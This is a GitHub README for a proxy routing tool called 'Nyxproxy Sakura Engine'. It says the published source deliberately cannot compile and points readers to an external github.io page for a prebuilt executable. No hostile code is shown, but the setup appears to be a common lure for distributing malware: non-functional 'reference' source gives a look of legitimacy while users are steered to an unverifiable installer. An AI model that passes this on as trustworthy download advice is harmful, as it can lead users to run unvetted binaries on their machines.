

https://github.com/user-attachments/assets/a0ccbd9e-50f4-463d-967f-1b1ba657290f

[![Status](https://img.shields.io/badge/status-active-3fb950?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)]()

# Nyxproxy Sakura Engine

Nyxproxy Sakura Engine is a high-performance network and proxy routing engine designed for traffic management and node handling.

This repository contains the **reference source code** of the engine, published for transparency purposes.

## ⚠️ Important — Install from the official site, not from this repository

- **This source code is not continuously maintained.** The actual, up-to-date, and supported version is published on the official website.
- **This repository cannot be compiled or executed as-is.** The program intentionally relies on a private build module that is not publicly distributed (see the [Why it doesn't compile](#why-it-doesnt-compile) section).
- To use Nyxproxy Sakura Engine, download the official executable/installer here:

  **👉 Official Website: [https://atomeopti.github.io/Nyxproxy-Sakura-Engine/](https://atomeopti.github.io/Nyxproxy-Sakura-Engine/)**

## Repository Contents

| File / Folder | Role |
|---------------|------|
| `cli_app.py`  | Command-line interface and entry point for the application. |
| `providers.py`| Proxy provider management and node handling logic. |
| `scraper.py`  | Internal data processing or node fetching utilities. |
| `index.html`  | Web interface or documentation assets. |
| `image_0.png` | Asset used for the interface documentation. |
| `LICENSE`     | Terms of use for this repository. |

## Why It Doesn't Compile

Nyxproxy Sakura Engine's infrastructure relies on secure server-side/build-side verifications. To prevent this public repository from being used as a base for unauthorized modified versions, the application imports a private component absent from this code.

This is intentional: this repository is meant for **reading** the code, not for producing a functional executable independently.

## Read / Contribute

```bash
# The code will intentionally exit without the private build module
python cli_app.py
